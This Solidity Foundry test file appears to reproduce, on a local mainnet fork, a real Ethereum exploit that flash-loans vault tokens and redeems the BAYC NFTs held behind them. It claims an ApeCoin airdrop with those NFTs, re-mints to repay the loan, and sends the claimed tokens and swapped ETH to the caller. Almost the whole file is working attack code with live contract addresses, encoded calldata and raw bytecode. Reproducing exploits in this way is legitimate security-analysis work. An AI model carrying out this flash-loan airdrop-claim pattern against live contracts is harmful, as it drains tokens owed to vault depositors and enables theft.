// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098
// https://etherscan.io/address/0x6703741e913a30D6604481472b6d81F3da45e6E8

interface I {
    function transferFrom(address, address, uint256) external payable;
    function claimTokens() external payable;
    function balanceOf(address) external payable returns (uint256);
    function swapExactTokensForETH(uint256, uint256, address[] memory, address, uint256) external payable;
    function flashLoan(address, address, uint256, bytes memory) external payable;
    function approve(address, uint256) external payable;
    function transfer(address, uint256) external payable;
    function mint(uint256[] memory, uint256[] memory) external payable;
    function apein() external payable;
    function atomicMatch_(
        address[14] memory,
        uint256[18] memory,
        uint8[8] memory,
        bytes memory,
        bytes memory,
        bytes memory,
        bytes memory,
        bytes memory,
        bytes memory,
        uint8[2] memory,
        bytes32[5] memory
    ) external payable;
    function redeem(uint256, uint256[] memory) external payable;
    function setApprovalForAll(address, bool) external payable;
}

contract X3ebd is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098");
    }

    address constant x0000 = 0x0000000000000000000000000000000000000000;
    address constant x4d22 = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;
    address constant x5b32 = 0x5b3256965e7C3cF26E11FCAf296DfC8807C01073;
    address constant x7a25 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant x7f26 = 0x7f268357A8c2552623316e2562D90e642bB538E5;
    address constant x9451 = 0x9451F0eF7a6BbBB6466B69cA19b7944D7Bb836fd;
    address constant xbaf2 = 0xBAf2127B49fC93CbcA6269FAdE0F7F31dF4c88a7;
    address constant xbc4c = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;

    address x7797;

    function test1() public {
        // vm.startPrank(0x6703741e913a30D6604481472b6d81F3da45e6E8, 0x6703741e913a30D6604481472b6d81F3da45e6E8);

        vm.createSelectFork("http://localhost:18545", 14403948); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0xa4fe71efbac101f877c1774d49781d2f28974b1e9052d3117f0a817a9810cd83));

        // https://explorer.phalcon.xyz/tx/eth/0xa4fe71efbac101f877c1774d49781d2f28974b1e9052d3117f0a817a9810cd83
        this.xa4fe71ef();
        // https://explorer.phalcon.xyz/tx/eth/0x8a61927598ce26f296ba1be155301418e2c01fe8f5585f9b46369e1ec5c408b0
        this.x8a619275();
        // https://explorer.phalcon.xyz/tx/eth/0x38e5465f09999c815adc3a5e878ec62fb669abed0144323401481c7b1f4cc376
        this.x38e5465f();
        // https://explorer.phalcon.xyz/tx/eth/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098
        xeb8c3beb();
    }

    function test2() public {
        // vm.startPrank(0x6703741e913a30D6604481472b6d81F3da45e6E8, 0x6703741e913a30D6604481472b6d81F3da45e6E8);

        vm.createSelectFork("http://localhost:18545", 14403789); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0xa4fe71efbac101f877c1774d49781d2f28974b1e9052d3117f0a817a9810cd83
        this.xa4fe71ef();
        vm.warp(1647517533);
        vm.roll(14403830);
        // https://explorer.phalcon.xyz/tx/eth/0x8a61927598ce26f296ba1be155301418e2c01fe8f5585f9b46369e1ec5c408b0
        this.x8a619275();
        vm.warp(1647519073);
        vm.roll(14403942);
        // https://explorer.phalcon.xyz/tx/eth/0x38e5465f09999c815adc3a5e878ec62fb669abed0144323401481c7b1f4cc376
        this.x38e5465f();
        vm.warp(1647519194);
        vm.roll(14403948);
        // https://explorer.phalcon.xyz/tx/eth/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098
        xeb8c3beb();
    }

    function test3() public {
        // vm.startPrank(, );

        vm.createSelectFork("http://localhost:18545", 14403948); // tx.blockNumber - 1

        vm.warp(1647519194);
        vm.roll(14403949);
        // https://explorer.phalcon.xyz/tx/eth/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098
        xeb8c3beb();
    }

    function x38e5465f() public {
        address[14] memory arr01;
        arr01[0] = x7f26;
        arr01[1] = tx.origin;
        arr01[2] = x9451;
        arr01[3] = x0000;
        arr01[4] = xbaf2;
        arr01[5] = x0000;
        arr01[6] = x0000;
        arr01[7] = x7f26;
        arr01[8] = x9451;
        arr01[9] = x0000;
        arr01[10] = x5b32;
        arr01[11] = xbaf2;
        arr01[12] = x0000;
        arr01[13] = x0000;
        uint256[18] memory arr02;
        arr02[0] = 500;
        arr02[1] = 0;
        arr02[2] = 0;
        arr02[3] = 0;
        arr02[4] = 106000000000000000000;
        arr02[5] = 0;
        arr02[6] = 1647519008;
        arr02[7] = 0;
        arr02[8] = 29244484474328575771191572449237208736608051522726113202259934637101728353875;
        arr02[9] = 500;
        arr02[10] = 0;
        arr02[11] = 0;
        arr02[12] = 0;
        arr02[13] = 106000000000000000000;
        arr02[14] = 0;
        arr02[15] = 1647518785;
        arr02[16] = 1648123282;
        arr02[17] = 2838764358252190726575258485395912858961493967669524552048145546038688914115;
        uint8[8] memory arr03;
        arr03[0] = 1;
        arr03[1] = 0;
        arr03[2] = 0;
        arr03[3] = 1;
        arr03[4] = 1;
        arr03[5] = 1;
        arr03[6] = 0;
        arr03[7] = 1;
        bytes memory b01 = abi.encode(
            hex"fb16a59500000000000000000000000000000000000000000000000000000000",
            136928415637726513163440928828100018675,
            hex"da45e6e8000000000000000000000000bc4ca0eda7647a8ab7c2061c2e118a18a936f13d000000000000000000000000000000000000000000000000000000000000042400000000000000000000000000000000000000000000000000000000",
            0,
            hex"000000c00000000000000000000000000000000000000000000000000000000000000000"
        );
        bytes memory b02 = abi.encode(
            hex"fb16a5950000000000000000000000009451f0ef7a6bbbb6466b69ca19b7944d7bb836fd00000000000000000000000000000000000000000000000000000000",
            250292741783229399063328720519515179544,
            hex"a936f13d000000000000000000000000000000000000000000000000000000000000042400000000000000000000000000000000000000000000000000000000",
            0,
            hex"000000c00000000000000000000000000000000000000000000000000000000000000000"
        );
        bytes memory b03 = abi.encode(
            hex"00000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000",
            0,
            0,
            0,
            0,
            0,
            hex"00000000"
        );
        bytes memory b04 = abi.encode(
            0,
            hex"00000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000",
            0,
            0,
            0,
            0,
            hex"00000000"
        );
        uint8[2] memory arr04;
        arr04[0] = 28;
        arr04[1] = 28;
        bytes32[5] memory arr05;
        arr05[0] = 0xfd650fc2f187d37e1fdf307866471c10be43cb8cb33e427bb193cee14c25ca2e;
        arr05[1] = 0x1fc869bdfa5f3b340afcd6d16088a04fe2fb62b7e4755436855b64bc57385bbc;
        arr05[2] = 0xfd650fc2f187d37e1fdf307866471c10be43cb8cb33e427bb193cee14c25ca2e;
        arr05[3] = 0x1fc869bdfa5f3b340afcd6d16088a04fe2fb62b7e4755436855b64bc57385bbc;
        arr05[4] = 0x0000000000000000000000000000000000000000000000000000000000000000;
        I(x7f26).atomicMatch_{value: 106000000000000000000}(
            arr01, arr02, arr03, b01, b02, b03, b04, "", "", arr04, arr05
        );
    }

    function xeb8c3beb() public {
        _constructor_();
    }

    function x8a619275() public {
        I(xbc4c).setApprovalForAll(r, true);
    }

    function xa4fe71ef() public {
        I(x4d22).approve(x7a25, 10000000000000000000000000000000000000000000000000);
    }

    function _constructor_() public {
        x7797 = address(new X7797());
        I(xbc4c).transferFrom(tx.origin, x7797, 1060);
        I(x7797).apein();

        bytes memory rt =
            hex"608060405234801561001057600080fd5b50600436106100365760003560e01c80637685807d1461003b578063b61d27f614610059575b600080fd5b610043610075565b60405161005091906102bc565b60405180910390f35b610073600480360381019061006e91906101f6565b610099565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b736703741e913a30d6604481472b6d81f3da45e6e873ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146100e557600080fd5b6000808473ffffffffffffffffffffffffffffffffffffffff16848460405161010e91906102a5565b60006040518083038185875af1925050503d806000811461014b576040519150601f19603f3d011682016040523d82523d6000602084013e610150565b606091505b50915091505050505050565b600061016f61016a846102fc565b6102d7565b90508281526020810184848401111561018b5761018a61045c565b5b6101968482856103b5565b509392505050565b6000813590506101ad8161047c565b92915050565b600082601f8301126101c8576101c7610457565b5b81356101d884826020860161015c565b91505092915050565b6000813590506101f081610493565b92915050565b60008060006060848603121561020f5761020e610466565b5b600061021d8682870161019e565b935050602061022e868287016101e1565b925050604084013567ffffffffffffffff81111561024f5761024e610461565b5b61025b868287016101b3565b9150509250925092565b60006102708261032d565b61027a8185610338565b935061028a8185602086016103c4565b80840191505092915050565b61029f8161037f565b82525050565b60006102b18284610265565b915081905092915050565b60006020820190506102d16000830184610296565b92915050565b60006102e16102f2565b90506102ed82826103f7565b919050565b6000604051905090565b600067ffffffffffffffff82111561031757610316610428565b5b6103208261046b565b9050602081019050919050565b600081519050919050565b600081905092915050565b600061034e82610355565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061038a82610391565b9050919050565b600061039c826103a3565b9050919050565b60006103ae82610355565b9050919050565b82818337600083830152505050565b60005b838110156103e25780820151818401526020810190506103c7565b838111156103f1576000848401525b50505050565b6104008261046b565b810181811067ffffffffffffffff8211171561041f5761041e610428565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b61048581610343565b811461049057600080fd5b50565b61049c81610375565b81146104a757600080fd5b5056fea2646970667358221220096186dca7762d97e388fdb6ad824cdfe954f37919d8be72d5d71eccdbf5012264736f6c63430008070033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract X7797 {
    address immutable r = address(this);
    receive() external payable {}
    address constant x025c = 0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F;
    address constant x4d22 = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant xbc4c = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xd9e1 = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address constant xea47 = 0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5;

    constructor() payable {}

    function onERC721Received(address, address, uint256, bytes memory) public {
        bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function apein() public {
        I(xea47).flashLoan(r, xea47, 5200000000000000000, hex"00");
        I(xea47).approve(xd9e1, type(uint256).max);
        // uint256 v1 = 200000000000000000;
        uint256 v1 = I(xea47).balanceOf(r);
        console2.log("I(xea47).balanceOf(r)\t\t->", "200000000000000000 (0.2000 ether)");

        address[] memory arr13 = new address[](2);
        arr13[0] = xea47;
        arr13[1] = xc02a;
        I(xd9e1).swapExactTokensForETH(v1, 5000000000000000000, arr13, tx.origin, block.timestamp + 1);

        // uint256 v2 = 60564000000000000000000;
        uint256 v2 = I(x4d22).balanceOf(r);
        console2.log("I(x4d22).balanceOf(r)\t\t->", "60564000000000000000000 (60564.0 ether)");
        I(x4d22).transfer(tx.origin, v2);
        // uint256 v3 = 60564000000000000000000;
        uint256 v3 = I(x4d22).balanceOf(tx.origin);
        console2.log("I(x4d22).balanceOf(tx.origin)\t->", "60564000000000000000000 (60564.0 ether)");
    }

    function onFlashLoan(address, address, uint256, uint256, bytes memory) public {
        // uint256 v1 = 5200000000000000000;
        uint256 v1 = I(xea47).balanceOf(r);
        console2.log("I(xea47).balanceOf(r)\t\t->", "5200000000000000000 (5.2000 ether)");

        uint256[] memory arr07 = new uint256[](0);
        I(xea47).redeem(5, arr07);

        // uint256 v2 = 0;
        uint256 v2 = I(xea47).balanceOf(r);
        console2.log("I(xea47).balanceOf(r)\t\t->", uint256(0));
        I(x025c).claimTokens();
        I(xbc4c).setApprovalForAll(xea47, true);

        uint256[] memory arr09 = new uint256[](6);
        arr09[0] = 7594;
        arr09[1] = 4755;
        arr09[2] = 9915;
        arr09[3] = 8214;
        arr09[4] = 8167;
        arr09[5] = 1060;
        uint256[] memory arr10 = new uint256[](0);
        I(xea47).mint(arr09, arr10);

        I(xea47).approve(xea47, type(uint256).max);

        bytes memory rt = hex"439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}
